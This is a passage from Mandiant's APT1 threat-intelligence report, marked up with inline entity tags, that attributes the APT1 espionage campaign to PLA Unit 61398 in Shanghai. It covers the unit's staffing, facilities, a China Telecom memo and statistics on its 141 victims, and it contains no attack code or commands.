<ORG>The Project 2049 Institute</ORG> reported in <TIMESTAMP>2011</TIMESTAMP> 
that <THREAT_ACTOR>Unit 61398</THREAT_ACTOR> “appears to function as the 
Third Department`s premier entity targeting the 
<COUNTRY>United States</COUNTRY> and <COUNTRY>Canada</COUNTRY>, most likely focusing 
on <INDUSTRY>political</INDUSTRY>, <INDUSTRY>economic</INDUSTRY>, and military-related 
intelligence.”14 Our research supports this and 
also suggests <THREAT_ACTOR>Unit 61398</THREAT_ACTOR>’s <ORG>CNO</ORG> activities are 
not limited to the <COUNTRY>U.S.</COUNTRY> and <COUNTRY>Canada</COUNTRY>, but likely 
extend to any organization where English is the 
primary language. 

Identifying <ORG>GSD</ORG> 3rd Department, 2nd Bureau as <THREAT_ACTOR>Unit 61398</THREAT_ACTOR>
The care with which the <ORG>PLA</ORG> maintains the separation between the <ORG>GSD</ORG> 3rd Department, 2nd Bureau, and the <ORG>MUCD</ORG> 
61398 can be partially observed by searching the Internet for official documents from the <ORG>Chinese government</ORG> that 
refer to both the 2nd Bureau and <THREAT_ACTOR>Unit 61398</THREAT_ACTOR>. Figure 2 shows the results of one of these queries.

FIGure 2: no results found for searching for “<ORG>GSD</ORG> 3rd Department 2nd Bureau” and “<THREAT_ACTOR>Unit 61398</THREAT_ACTOR>” on any 
<ORG>Chinese government</ORG> websites

Despite our challenges finding a link between the <ORG>Chinese Government</ORG> and <THREAT_ACTOR>Unit 61398</THREAT_ACTOR> online, our searches did find 
references online indicating that the <ORG>GSD</ORG> 3rd Department, 2nd Bureau, is actually <THREAT_ACTOR>Unit 61398</THREAT_ACTOR>. Specifically, <ORG>Google</ORG> 
indexed references to <THREAT_ACTOR>Unit 61398</THREAT_ACTOR> in forums and resumes. Once these references were discovered by <ORG>CPC</ORG> censors, 
these postings and documents were likely modified or removed from the Internet. Figure 3 shows <ORG>Google</ORG> search results 

12 <IDENTITY>Mark A. Stokes</IDENTITY>, <IDENTITY>Jenny Lin</IDENTITY>, and <IDENTITY>L.C. Russell Hsiao</IDENTITY>, “<ORG>The Chinese People’s Liberation Army</ORG> Signals Intelligence and Cyber Reconnaissance 
Infrastructure,” <ORG>Project 2049 Institute</ORG> (<TIMESTAMP>2011</TIMESTAMP>): 8, http://project2049.net/documents/pla_third_department_sigint_cyber_stokes_lin_hsiao.pdf, 
accessed <TIMESTAMP>February 6, 2013</TIMESTAMP>.
13 <COUNTRY>U.S.</COUNTRY> <ORG>Department of Defense</ORG> defines Computer Network Operations as “Comprised of computer network attack, computer network defense, and 
related computer network exploitation enabling operations. Also called <ORG>CNO</ORG>. 
 • computer network attack. Actions taken through the use of computer networks to disrupt, deny, degrade, or destroy information resident in  
  computers and computer networks, or the computers and networks themselves. Also called <ORG>CNA</ORG>. 
 • computer network defense. Actions taken to protect, monitor, analyze, detect, and respond to unauthorized activity within the Department of  
  Defense information systems and computer networks. Also called <ORG>CND</ORG>. 
 • computer network exploitation. Enabling operations and intelligence collection capabilities conducted through the use of computer networks to  
  gather data from target or adversary automated information systems or networks. Also called <ORG>CNE</ORG>.” 
<COUNTRY>U.S.</COUNTRY> <ORG>Department of Defense</ORG>, The Dictionary of Military Terms (<CITY>New York</CITY>: <ORG>Skyhorse Publishing, Inc.</ORG>), 112.
14 <IDENTITY>Mark A. Stokes</IDENTITY>, <IDENTITY>Jenny Lin</IDENTITY>, and <IDENTITY>L.C. Russell Hsiao</IDENTITY>, “<ORG>The Chinese People’s Liberation Army</ORG> Signals Intelligence and Cyber Reconnaissance 
Infrastructure,” <ORG>Project 2049 Institute</ORG> (<TIMESTAMP>2011</TIMESTAMP>): 8, http://project2049.net/documents/pla_third_department_sigint_cyber_stokes_lin_hsiao.pdf, 
accessed <TIMESTAMP>February 6, 2013</TIMESTAMP>.

what is a <ORG>MUCD</ORG>?
<ORG>Chinese military</ORG> units are given <ORG>MUCD</ORG>s, five-digit 
numerical sequences, to provide basic anonymity for the 
unit in question and as a standardized reference that 
facilitates communications and operations (e.g., “Unit 
81356 is moving to the objective,” versus “1st Battalion, 
125th Regiment, 3rd Division, 14th Group Army is 
moving to the objective”). <ORG>Military Unit Cover Designators</ORG>
are also used in official publications and on the Internet 
to refer to the unit in question. The <ORG>MUCD</ORG> numbers are 
typically displayed outside a unit’s barracks, as well as on 
the unit’s clothing, flags, and stationary.

Source: The <ORG>Chinese Army</ORG> Today: Tradition and Transformation 
for the 21st Century — <IDENTITY>Dennis J. Blasko</IDENTITY>

http://project2049.net/documents/pla_third_department_sigint_cyber_stokes_lin_hsiao.pdf
http://project2049.net/documents/pla_third_department_sigint_cyber_stokes_lin_hsiao.pdf


<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 10 www.mandiant.com

for <THREAT_ACTOR>Unit 61398</THREAT_ACTOR> and some responsive “hits” (note that the links that appear in these search results will likely have been 
removed by the time you read this report):

FIGure 3: <ORG>Google</ORG> search results that show <THREAT_ACTOR>Unit 61398</THREAT_ACTOR> attribution “leaks”

<THREAT_ACTOR>Unit 61398</THREAT_ACTOR>’s Personnel requirements
<THREAT_ACTOR>Unit 61398</THREAT_ACTOR> appears to be actively soliciting and training English speaking personnel specializing in a wide variety 
of cyber topics. Former and current personnel from the unit have publicly alluded to these areas of emphasis. For 
example, a graduate student of covert communications, <IDENTITY>Li Bingbing</IDENTITY> (李兵兵), who openly acknowledged his affiliation 
with <THREAT_ACTOR>Unit 61398</THREAT_ACTOR>, published a paper in <TIMESTAMP>2010</TIMESTAMP> that discussed embedding covert communications within <SOFTWARE>Microsoft® Word</SOFTWARE> 
documents. Another example is English linguist <IDENTITY>Wang Weizhong</IDENTITY>’s (王卫忠) biographical information, provided to the 
<ORG>Hebei Chamber of Commerce</ORG>, which describes the training he received as an English linguist while assigned to 
<THREAT_ACTOR>Unit 61398</THREAT_ACTOR>. These and other examples that demonstrate <THREAT_ACTOR>Unit 61398</THREAT_ACTOR>’s areas of expertise are listed in Table 1 below.15

taBLe 1: Chinese sources referring to the areas of expertise contained in <THREAT_ACTOR>Unit 61398</THREAT_ACTOR>.16.17.18.19

type of expertise in <THREAT_ACTOR>Unit 61398</THREAT_ACTOR> (部队) source Describing that expertise in <THREAT_ACTOR>Unit 61398</THREAT_ACTOR>
Covert Communications Article in <ORG>Chinese academic journal</ORG>. Second author <IDENTITY>Li Bingbing</IDENTITY> (李兵兵) 

references <THREAT_ACTOR>Unit 61398</THREAT_ACTOR> as the source of his expertise on the topic.15

English Linguistics Bio of <ORG>Hebei Chamber of Commerce</ORG> member <IDENTITY>Wang Weizhong</IDENTITY> (王卫忠). 
He describes that he received his training as an English linguist during his 
service in <THREAT_ACTOR>Unit 61398</THREAT_ACTOR>. (Hebei is a borough in <CITY>Shanghai</CITY>.)16

Operating System Internals Article in <ORG>Chinese academic journal</ORG>. Second author <IDENTITY>Yu Yunxiang</IDENTITY> (虞云翔) 
references <THREAT_ACTOR>Unit 61398</THREAT_ACTOR> as the source of his expertise on the topic.17

Digital Signal Processing Article in <ORG>Chinese academic journal</ORG>. Second author <IDENTITY>Peng Fei</IDENTITY> (彭飞) 
references <THREAT_ACTOR>Unit 61398</THREAT_ACTOR> as the source of his expertise on the topic.18

Network Security Article in <ORG>Chinese academic journal</ORG>. Third author <IDENTITY>Chen Yiqun</IDENTITY> (陈依群) 
references <THREAT_ACTOR>Unit 61398</THREAT_ACTOR> as the source of his expertise on the topic.19

15 <IDENTITY>Li Bing-bing</IDENTITY>, <IDENTITY>Wang Yan-Bo</IDENTITY>, and <IDENTITY>Xu Ming</IDENTITY>, “An information hiding method of <SOFTWARE>Word 2007</SOFTWARE> based on image covering,” <ORG>Journal of Sichuan University</ORG> 
(Natural Science Edition) 47 (<TIMESTAMP>2010</TIMESTAMP>), http://www.paper.edu.cn/journal/downCount/0490-6756(2010)S1-0031-06, accessed <TIMESTAMP>February 6, 2013</TIMESTAMP>.
16 <ORG>Hebei Chamber of Commerce</ORG>, Bio of member <IDENTITY>Wang Weizhong</IDENTITY> (<TIMESTAMP>2012</TIMESTAMP>), http://www.hbsh.org/shej_ejsheqmsg.
aspx?mid=26&uid=06010000&aid=06, accessed <TIMESTAMP>February 6, 2013</TIMESTAMP>.
17 <IDENTITY>Zeng Fan-jing</IDENTITY>, <IDENTITY>Yu Yun-xiang</IDENTITY>, and <IDENTITY>Chang Li</IDENTITY>, “The Implementation of Overlay File System in Embedded Linux,” <ORG>Journal of Information Engineering University</ORG> 7 (<TIMESTAMP>2006</TIMESTAMP>), http://file.lw23.com/9/98/984/98401889-9da6-4c38-b9d2-5a5202fd1a33.pdf, accessed <TIMESTAMP>February 6, 2013</TIMESTAMP>.
18 <IDENTITY>Zhao Ji-yong</IDENTITY>, <IDENTITY>Peng Fei</IDENTITY>, and <IDENTITY>Geng Chang-suo</IDENTITY>, “ADC’s Performance and Selection Method of Sampling Number of Bits,” <ORG>Journal of Military Communications Technology</ORG> 26, (<TIMESTAMP>2005</TIMESTAMP>), http://file.lw23.com/f/f1/f14/f14e7b60-3d60-4184-a48f-4a50dd21927c.pdf, accessed <TIMESTAMP>February 6, 2013</TIMESTAMP>.
19 <IDENTITY>Chen Qiyun</IDENTITY>, <IDENTITY>Chen Xiuzhen</IDENTITY>, <IDENTITY>Chen Yiqun</IDENTITY>, and <IDENTITY>Fan Lei</IDENTITY>, “Quantization Evaluation Algorithm for Attack Graph Based on Node Score,” Computer Engineering 36 (<TIMESTAMP>2010</TIMESTAMP>), http://www.ecice06.com/CN/article/downloadArticleFile.do?attachType=PDF&id=19627, accessed <TIMESTAMP>February 7, 2013</TIMESTAMP>.



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 11 www.mandiant.com

Additionally, there is evidence that <THREAT_ACTOR>Unit 61398</THREAT_ACTOR> aggressively recruits new talent from the Science and Engineering 
departments of universities such as <ORG>Harbin Institute of Technology</ORG> (哈尔滨工业大学) and <ORG>Zhejiang University School of Computer Science and Technology</ORG> (浙江大学计算机学院). The majority of the “profession codes” (专业代码) 
describing positions that <THREAT_ACTOR>Unit 61398</THREAT_ACTOR> is seeking to fill require highly technical computer skills. The group also appears 
to have a frequent requirement for strong English proficiency. Table 2 provides two examples of profession codes for 
positions in <THREAT_ACTOR>Unit 61398</THREAT_ACTOR>, along with the required university courses and proficiencies associated with each profession.20

taBLe 2: two profession codes and university recommended courses for students intending to apply for positions 
in <THREAT_ACTOR>Unit 61398</THREAT_ACTOR>

Profession Code required Proficiencies

080902 — Circuits and Systems »» 101 — Political

»» 201 — English

»» 301 — Mathematics

»» 842 — Signal and Digital Circuits (or) 840 - Circuits

»» Interview plus a small written test:

»− Circuits and Systems-based professional knowledge and comprehensive 
capacity

»− Team spirit and ability to work with others to coordinate

»− English proficiency

081000 — <INDUSTRY>Information and Communications Engineering</INDUSTRY>

»» 101 - Political

»» 201 – British [English]

»» 301 - Mathematics

»» 844 - Signal Circuit Basis

size and Location of <THREAT_ACTOR>Unit 61398</THREAT_ACTOR>’s Personnel and Facilities
Based on the size of <THREAT_ACTOR>Unit 61398</THREAT_ACTOR>’s physical infrastructure, we estimate that the unit is staffed by hundreds, and 
perhaps thousands. This is an extrapolation based on public disclosures from within <COUNTRY>China</COUNTRY> describing the location 
and physical installations associated with <THREAT_ACTOR>Unit 61398</THREAT_ACTOR>. For example, public sources confirm that <TIMESTAMP>in early 2007</TIMESTAMP>, <ORG>Jiangsu Longhai Construction Engineering Group</ORG> (江苏龙海建工集团有限公司) completed work on a new building for
<THREAT_ACTOR>Unit 61398</THREAT_ACTOR> located at Datong Road 208 within the Pudong New Area of <CITY>Shanghai</CITY> (上海市浦东新区高桥镇大同路208号),21 
which is referred to as the “<THREAT_ACTOR>Unit 61398</THREAT_ACTOR> Center Building” (61398部队中心大楼). At 12 stories in height, and offering 
130,663 square feet of space, we estimate that this building houses offices for approximately 2,000 people. Figure 4 
through Figure 7 provide overhead views and street-level views of the building and its location, showing its size. This is 
only one of the unit’s several buildings, some of which are even larger.

20 Two Chinese universities hosting <THREAT_ACTOR>Unit 61398</THREAT_ACTOR> recruiting events: 
 • <ORG>Zhejiang University</ORG>: http://www.cs.zju.edu.cn/chinese/redir.php?catalog_id=101913&object_id=106021 
 • <ORG>Harbin Institute of Technology</ORG>: http://today.hit.edu.cn/articles/2004/2-23/12619.htm
21 See http://www.czzbb.net/czzb/YW_Info/YW_ZiGeYS/BaoMingInfo.aspx?YW_RowID=41726&BiaoDuanBH=CZS20091202901&enterprise_
id=70362377-3 for documentation of the contract award to <ORG>Jiangsu Langhai Construction Engineering Group</ORG> for <THREAT_ACTOR>Unit 61398</THREAT_ACTOR>’s Center Building, 
among several other buildings; accessed <TIMESTAMP>February 5, 2013</TIMESTAMP>.

http://www.cs.zju.edu.cn/chinese/redir.php?catalog_id=101913&object_id=106021
http://today.hit.edu.cn/articles/2004/2-23/12619.htm


<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 12 www.mandiant.com

FIGure 4: Datong circa <TIMESTAMP>2006</TIMESTAMP> (prior to <THREAT_ACTOR>Unit 61398</THREAT_ACTOR> Center Building construction) Image Copyright <TIMESTAMP>2013</TIMESTAMP> 
DigitalGlobe



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 13 www.mandiant.com

FIGure 5: Datong Circa <TIMESTAMP>2008</TIMESTAMP> (<THREAT_ACTOR>Unit 61398</THREAT_ACTOR> Center Building visible at 208 Datong) Image Copyright <TIMESTAMP>2013</TIMESTAMP>
DigitalGlobe



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 14 www.mandiant.com

FIGure 6: <THREAT_ACTOR>Unit 61398</THREAT_ACTOR> Center Building (main gate, soldiers visible) Image Copyright <TIMESTAMP>2013</TIMESTAMP> city8.com



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 15 www.mandiant.com

FIGure 7: <THREAT_ACTOR>Unit 61398</THREAT_ACTOR> Center Building 208 Datong (rear view, possible generator exhausts visible) Image 
Copyright <TIMESTAMP>2013</TIMESTAMP> city8.com



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 16 www.mandiant.com

<THREAT_ACTOR>Unit 61398</THREAT_ACTOR> also has a full assortment of support units and associated physical infrastructure, much of which is located 
on a stretch of Datong Road (大同路) in <CITY>Gaoqiaozhen</CITY> (高桥镇), in the Pudong New Area (浦东新区) of <CITY>Shanghai</CITY> (上
海).22 These support units include a logistics support unit, outpatient clinic, and kindergarten, as well as guesthouses 
located both in <CITY>Gaoqiaozhen</CITY> and in other locations in <CITY>Shanghai</CITY>.23 These amenities are usually associated with large 
military units or units at higher echelons. The close proximity of these amenities supports the contention that <THREAT_ACTOR>Unit 61398</THREAT_ACTOR> occupies a high-level position in the <ORG>PLA</ORG> organizational hierarchy (see Figure 1: <THREAT_ACTOR>Unit 61398</THREAT_ACTOR>’s positions within 
the <ORG>PLA</ORG>).24

<THREAT_ACTOR>PLA Unit 61398</THREAT_ACTOR> and state-owned enterprise <ORG>China telecom</ORG> are Co-building Computer network 
operations Infrastructure
<ORG>Mandiant</ORG> found an internal <ORG>China Telecom</ORG> document online that provides details about the infrastructure provided 
to <THREAT_ACTOR>Unit 61398</THREAT_ACTOR>. The memo (in Figure 8) reveals <ORG>China Telecom</ORG> executives deciding to “co-build” with <THREAT_ACTOR>Unit 61398</THREAT_ACTOR> to 
justify the use of their own inventory in the construction of fiber optic communication lines “based on the principle that 
national defense construction is important.” The letter also appears to indicate that this is a special consideration being 
made outside of <ORG>China Telecom</ORG>’s “normal renting method” for <THREAT_ACTOR>Unit 61398</THREAT_ACTOR>. Additionally, the memo clarifies the phrase 
“<THREAT_ACTOR>Unit 61398</THREAT_ACTOR>” with the comment “(<ORG>GSD</ORG> 3rd Department, 2nd Bureau).” The memo not only supports the identity 
of <THREAT_ACTOR>Unit 61398</THREAT_ACTOR> as <ORG>GSD</ORG>’s 3rd Department 2nd Bureau, but also reveals the relationship between a “very important 
communication and control department” (<THREAT_ACTOR>Unit 61398</THREAT_ACTOR>) and a state-influenced enterprise.

22 Confirmation of several other <THREAT_ACTOR>Unit 61398</THREAT_ACTOR> support facilities along Datong Road:
 Address: 上海市浦东新区大同路50号 (Pudong New Area, <CITY>Shanghai</CITY>, Datong Road 50)
 Building Name: 中国人民解放军第61398部队司令部 (<ORG>People’s Liberation Army</ORG> <THREAT_ACTOR>Unit 61398</THREAT_ACTOR> Headquarters)
 Source: Chinese phone book listing building name and address; http://114.mingluji.com/minglu/%E4%B8%AD%E5%9B%BD%E4%BA%BA%E6 

%B0%91%E8%A7%A3%E6%94%BE%E5%86%9B% E7%AC%AC61398%E9%83%A8%E9%98%9F%E5%8F%B8%E4%B-
B%A4%E9%83%A8, accessed <TIMESTAMP>February 6, 2013</TIMESTAMP>.

 Address: 上海市浦东新区大同路118弄甲 (Pudong New Area, <CITY>Shanghai</CITY>, Datong Road 118 A)
 Building Name: 中国人民解放军第61398部队司令部 (<ORG>People’s Liberation Army</ORG> <THREAT_ACTOR>Unit 61398</THREAT_ACTOR> Headquarters)

 Chinese phone book listing building name and address; http://114.mingluji.com/minglu/%E4%B8%AD%E5%9B%BD%E4%BA%BA%E6%B0%
91%E8%A7%A3%E6%94%BE%E5%86%9B%E7%AC%AC61398%E9%83%A8%E9%98%9F%E5%8F%B8%E4%BB%A4%E9%83%A8_0, 
accessed <TIMESTAMP>February 6, 2013</TIMESTAMP>.

 Address: 上海市浦东新区高桥镇大同路135号 (Pudong New Area, <CITY>Shanghai</CITY> <CITY>Gaoqiao Town</CITY>, Datong Road 135)
 Building Name: 中国人民解放军第61398部队 (<ORG>People’s Liberation Army</ORG> <THREAT_ACTOR>Unit 61398</THREAT_ACTOR>)

 Chinese phone book listing building name and address; http://114.mingluji.com/minglu/%E4%B8%AD%E5%9B%BD%E4%BA%BA%E6%B0%9
1%E8%A7%A3%E6%94%BE%E5%86%9B%E7%AC%AC61398%E9%83%A8%E9%98%9F_0, accessed <TIMESTAMP>February 6, 2013</TIMESTAMP>.

 Address: 上海市浦东新区高桥镇大同路153号 (Pudong New Area, <CITY>Shanghai</CITY> <CITY>Gaoqiao Town</CITY>, Datong Road 153)
 Building Name: 中国人民解放军第61398部队 (<ORG>People’s Liberation Army</ORG> <THREAT_ACTOR>Unit 61398</THREAT_ACTOR>)
 Chinese phone book listing building name and address; http://114.mingluji.com/minglu/%E4%B8%AD%E5%9B%BD%E4%BA%BA%E6%B0%9

1%E8%A7%A3%E6%94%BE%E5%86%9B%E7%AC%AC61398%E9%83%A8%E9%98%9F, accessed <TIMESTAMP>February 6, 2013</TIMESTAMP>.

 Address: 上海市浦东新区大同路305号 (Pudong New Area, <CITY>Shanghai</CITY>, Datong Road 305)
 Building Name: 中国人民解放军第61398部队后勤部 (Logistics Department of <ORG>The Chinese <ORG>People’s Liberation Army</ORG></ORG> <THREAT_ACTOR>Unit 61398</THREAT_ACTOR>)(
 Chinese phone book listing building name and address; http://114.mingluji.com/category/%E7%B1%B-

B%E5%9E%8B/%E4%B8%AD%E5%9B%BD%E4%BA%BA%E6%B0%91%E8%A7%A3%E6%94%BE%E5%86%9B?page=69, accessed 
<TIMESTAMP>February 6, 2013</TIMESTAMP>.

23 <THREAT_ACTOR>Unit 61398</THREAT_ACTOR> Kindergarden Listed in <CITY>Shanghai</CITY> Pudong: http://www.pudong-edu.sh.cn/Web/PD/jyzc_school.aspx?SiteID=45&UnitID=2388
24 James C. Mulvenon and Andrew N. D. Yang, editors, The <ORG>People’s Liberation Army</ORG> as Organization: Reference Volume v1.0, (<CITY>Santa Monica</CITY>, CA: 
<ORG>RAND Corporation</ORG>, <TIMESTAMP>2002</TIMESTAMP>), 125, http://www.rand.org/pubs/conf_proceedings/CF182.html, accessed <TIMESTAMP>February 6, 2013</TIMESTAMP>.



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 17 www.mandiant.com

FIGure 8: <ORG>China telecom</ORG> Memo discussing <THREAT_ACTOR>unit 61398</THREAT_ACTOR> source:  
http://r9.he3.com.cn/%e8%a7%84%e5%88%92/%e9%81%93%e8%B7%aF%e5%8F%8a%e5%85%B6%e
4%BB%96%e8%a7%84%e5%88%92%e5%9B%Be%e7%Ba%B8/%e4%BF%a1%e6%81%aF%e5%9B%a
D%e5%8C%Ba/%e5%85%B3%e4%Ba%8e%e6%80%BB%e5%8F%82%e4%B8%89%e9%83%a8%e4%B
a%8C%e5%B1%80-%e4%B8%8a%e6%B5%B7005%e4%B8%aD%e5%BF%83%e9%9C%80%e4%BD%B-
F%e7%94%a8%e6%88%91%e5%85%aC%e5%8F%B8%e9%80%9a%e4%BF%a1.pdf25

25 This link has Chinese characters in it which are represented in URL encoding



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 18 www.mandiant.com

Market Department Examining Control Affairs Division Report

Requesting Concurrence Concerning the <ORG>General Staff Department</ORG> 3rd Department 2nd Bureau 
Request to Use Our Company’s Communication Channel

Division Leader Wu:

<ORG>The Chinese People’s Liberation Army</ORG> <THREAT_ACTOR>Unit 61398</THREAT_ACTOR> (<ORG>General Staff Department</ORG> 3rd Department 
2nd Bureau) wrote to us a few days ago saying that, in accordance with their central command 
“8508” on war strategy construction [or infrastructure] need, the <ORG>General Staff Department</ORG> 
3rd Department 2nd Bureau (<CITY>Gaoqiao</CITY> Base) needs to communicate with <CITY>Shanghai</CITY> City 005 
Center (<ORG>Shanghai Intercommunication Network Control Center</ORG> within East Gate Bureau) 
regarding intercommunication affairs. This bureau already placed fiber-optic cable at the 
East Gate front entrance [road pole]. They need to use two ports to enter our company’s 
East Gate communication channel. The length is about 30m. At the same time, the second 
stage construction (in <CITY>Gaoqiao</CITY> Base) needs to enter into our company’s <CITY>Shanghai</CITY> <ORG>Nanhui Communication Park</ORG> 005 Center (special-use bureau). This military fiber-optic cable has 
already been placed at the <CITY>Shanghai</CITY> <ORG>Nanhui Communication Park</ORG> entrance. They need to use 
4 of our company ports inside the <ORG>Nanhui Communication Park</ORG> to enter. The length is 600m. 
Upon our division’s negotiation with the 3rd Department 2nd Bureau’s communication branch, 
the military has promised to pay at most 40,000 Yuan for each port. They also hope <ORG>Shanghai Telecom</ORG> will smoothly accomplish this task for the military based on the principle that national 
defense construction is important. After checking the above areas’ channels, our company has a 
relatively abundant inventory to satisfy the military’s request.

This is our suggestion: because this is concerning defense construction, and also the 3rd 
Department 2nd Bureau is a very important communication control department, we agree to 
provide the requested channels according to the military’s suggested price. Because this is a 
one-time payment, and it is difficult to use the normal renting method, we suggest our company 
accept one-time payment using the reason of “Military Co-Construction [with <ORG>China Telecom</ORG>] of 
Communication Channels” and provide from our inventory. The military’s co-building does not 
interfere with our proprietary rights. If something breaks, the military is responsible to repair it 
and pay for the expenses. After you agree with our suggestion, we will sign an agreement with 
the communication branch of <THREAT_ACTOR>61398</THREAT_ACTOR> and implement it.

Please provide a statement about whether the above suggestion is appropriate or not.

[Handwritten Note]Agree with the Market Department Examining Control Affairs Division 
suggestion; inside the agreement clearly [...define? (illegible) ...] both party’s responsibilities.

FIGure 9: english translation of <ORG>China telecom</ORG> Memo 

 



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 19 www.mandiant.com

Synopsis of <THREAT_ACTOR>PLA Unit 61398</THREAT_ACTOR> 

The evidence we have collected on <THREAT_ACTOR>PLA Unit 61398</THREAT_ACTOR>’s mission and infrastructure reveals an organization that:

»» Employs hundreds, perhaps thousands of personnel

»» Requires personnel trained in computer security and computer network operations

»» Requires personnel proficient in the English language

»» Has large-scale infrastructure and facilities in the “Pudong New Area” of <CITY>Shanghai</CITY>

»» Was the beneficiary of special fiber optic communication infrastructure provided by state-owned enterprise <ORG>China Telecom</ORG> in the name of national defense

The following sections of this report detail <THREAT_ACTOR>APT1</THREAT_ACTOR>’s cyber espionage and data theft operations. The sheer scale and 
duration of these sustained attacks leave little doubt about the enterprise scale of the organization behind this 
campaign. We will demonstrate that the nature of <THREAT_ACTOR>APT1</THREAT_ACTOR>’s targeted victims and the group’s infrastructure and tactics 
align with the mission and infrastructure of <THREAT_ACTOR>PLA Unit 61398</THREAT_ACTOR>.



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 20 www.mandiant.com

<THREAT_ACTOR>APT1</THREAT_ACTOR>: years oF 
esPIonaGe 

Our evidence indicates that <THREAT_ACTOR>APT1</THREAT_ACTOR> has been stealing hundreds of terabytes of 
data from at least 141 organizations across a diverse set of industries beginning 
<TIMESTAMP>as early as 2006</TIMESTAMP>. Remarkably, we have witnessed <THREAT_ACTOR>APT1</THREAT_ACTOR> target dozens of 
organizations simultaneously. Once the group establishes access to a victim’s 
network, they continue to access it periodically over several months or years 
to steal large volumes of valuable intellectual property, including technology 
blueprints, proprietary manufacturing processes, test results, business plans, 
pricing documents, partnership agreements, emails and contact lists from victim 
organizations’ leadership. We believe that the extensive activity we have directly 
observed represents only a small fraction of the cyber espionage that <THREAT_ACTOR>APT1</THREAT_ACTOR> has 
committed.

<THREAT_ACTOR>APT1</THREAT_ACTOR> Puts the “Persistent” in <THREAT_ACTOR>APT</THREAT_ACTOR>

<TIMESTAMP>Since 2006</TIMESTAMP> we have seen <THREAT_ACTOR>APT1</THREAT_ACTOR> relentlessly expand its access to new victims. 
Figure 10 shows the timeline of the 141 compromises we are aware of; each 
marker in the figure represents a separate victim and indicates the earliest 
confirmed date of <THREAT_ACTOR>APT1</THREAT_ACTOR> activity in that organization’s network.26

With the ephemeral nature of electronic evidence, many of the dates of earliest 
known <THREAT_ACTOR>APT1</THREAT_ACTOR> activity shown here underestimate the duration of <THREAT_ACTOR>APT1</THREAT_ACTOR>’s presence in 
the network.

FIGure 10: timeline showing dates of earliest known <THREAT_ACTOR>APT1</THREAT_ACTOR> activity in the 
networks of the 141 organizations in which <ORG>Mandiant</ORG> has observed <THREAT_ACTOR>APT1</THREAT_ACTOR> 
conducting cyber espionage.

26 Figure 10 shows that we have seen <THREAT_ACTOR>APT1</THREAT_ACTOR> compromise an increasing number of organizations each 
year, which may reflect an increase in <THREAT_ACTOR>APT1</THREAT_ACTOR>’s activity. However, this increase may also simply reflect 
<ORG>Mandiant</ORG>’s expanding visibility into <THREAT_ACTOR>APT1</THREAT_ACTOR>’s activities as the company has grown and victims’ awareness 
of cyber espionage activity in their networks has improved.

<TIMESTAMP>2006</TIMESTAMP>

<TIMESTAMP>2007</TIMESTAMP>

<TIMESTAMP>2008</TIMESTAMP>

<TIMESTAMP>2009</TIMESTAMP>

<TIMESTAMP>2010</TIMESTAMP>

<TIMESTAMP>2011</TIMESTAMP>

<TIMESTAMP>2012</TIMESTAMP>

<TIMESTAMP>2013</TIMESTAMP>

Organizations compromised 
by <THREAT_ACTOR>APT1</THREAT_ACTOR> over time



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 21 www.mandiant.com

Longest time period within
which <THREAT_ACTOR>APT1</THREAT_ACTOR> has continued 
to access a victim’s network:

<TIMESTAMP>4 Years, 10 Months</TIMESTAMP>

Once <THREAT_ACTOR>APT1</THREAT_ACTOR> has compromised a network, they repeatedly monitor and steal 
proprietary data and communications from the victim for months or even 
years. For the organizations in Figure 10, we found that <THREAT_ACTOR>APT1</THREAT_ACTOR> maintained 
access to the victim’s network for an average of <TIMESTAMP>356 days</TIMESTAMP>.27 The longest time 
period <THREAT_ACTOR>APT1</THREAT_ACTOR> maintained access to a victim’s network was at least 1,764 days, 
or four years and ten months. <THREAT_ACTOR>APT1</THREAT_ACTOR> was not continuously active on a daily 
basis <TIMESTAMP>during this time period</TIMESTAMP>; however, in the vast majority of cases we 
observed, <THREAT_ACTOR>APT1</THREAT_ACTOR> continued to commit data theft as long as they had access to 
the network.

<THREAT_ACTOR>APT1</THREAT_ACTOR>’s Geographic & Industry Focus

The organizations targeted by <THREAT_ACTOR>APT1</THREAT_ACTOR> primarily conduct their operations in English. However, we have also seen the 
group target a small number of non-English speaking victims. A full 87% of the <THREAT_ACTOR>APT1</THREAT_ACTOR> victims we have observed are 
headquartered in countries where English is the native language (see Figure 11). This includes 115 victims located 
in the <COUNTRY>U.S.</COUNTRY> and seven in <COUNTRY>Canada</COUNTRY> and the <COUNTRY>United Kingdom</COUNTRY>. Of the remaining 19 victims, 17 use English as a primary 
language for operations. These include international cooperation and development agencies, foreign governments 
in which English is one of multiple official languages, and multinational conglomerates that primarily conduct their 
business in English. Only two victims appear to operate using a language other than English. Given that English-
language proficiency is required for many members of <THREAT_ACTOR>PLA Unit 61398</THREAT_ACTOR>, we believe that the two non-English speaking 
victims are anomalies representing instances in which <THREAT_ACTOR>APT1</THREAT_ACTOR> performed tasks outside of their normal activities. 

27  This is based on 91 of the 141 victim organizations shown. In the remaining cases, <THREAT_ACTOR>APT1</THREAT_ACTOR> activity is either ongoing or else we do not have visibility 
into the last known date of <THREAT_ACTOR>APT1</THREAT_ACTOR> activity in the network.



<ORG>Mandiant</ORG> <THREAT_ACTOR>APT1</THREAT_ACTOR> 22 www.mandiant.com

5 <COUNTRY>United Kingdom</COUNTRY>

1 <COUNTRY>Norway</COUNTRY>

1 <COUNTRY>France</COUNTRY>

1 <COUNTRY>South Africa</COUNTRY>

1 <COUNTRY>Japan</COUNTRY>

2 <COUNTRY>Singapore</COUNTRY>

2 <COUNTRY>Taiwan</COUNTRY>

3 <COUNTRY>India</COUNTRY>

1 <COUNTRY>UAE</COUNTRY>

3 <COUNTRY>Israel</COUNTRY>
2 <COUNTRY>Switzerland</COUNTRY>

1 <COUNTRY>Luxemborg</COUNTRY>

